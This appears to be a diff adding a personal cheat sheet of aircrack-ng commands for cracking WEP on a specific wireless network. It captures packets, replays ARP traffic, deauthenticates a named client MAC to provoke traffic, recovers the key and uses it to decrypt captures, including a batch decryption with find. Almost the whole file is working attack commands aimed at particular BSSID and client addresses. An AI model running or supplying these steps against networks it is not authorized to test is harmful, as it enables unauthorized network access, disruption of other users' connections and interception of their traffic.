@@ -1,0 +1,23 @@
+
+# start catching more packets
+# (apparently if the wep key is set in ath0, this will catch
+# unencrypted traffic...?)
+airodump-ng -c 11 -w newcapturehax mon0
+
+# start trying to crack the packets
+aircrack-ng -a 1 -b 00:0D:0B:6C:DC:F1 /var/log/kismet/Kismet-Sep-*.dump newcapturehax-01.cap
+
+# replay caught arp packets to generate more traffic
+aireplay-ng --arpreplay -b 00:0D:0B:6C:DC:F1 -h 00:0D:0B:71:2F:C3 mon0
+
+# deauth someone to get the inital arp packet
+aireplay-ng --deauth 1 -a 00:0D:0B:6C:DC:F1 -c 00:0D:0B:71:2F:C3 mon0
+
+
+# decrypt an old capture file after finding the key
+airdecap-ng -w 31:30:32:32:6B  test-un.cap
+
+# decrypt all files starting with K
+# (I really just wanted an example of using find...)
+find . -maxdepth 1 -name "K*" -exec airdecap-ng -w 31:30:32:32:6B {} \;
+
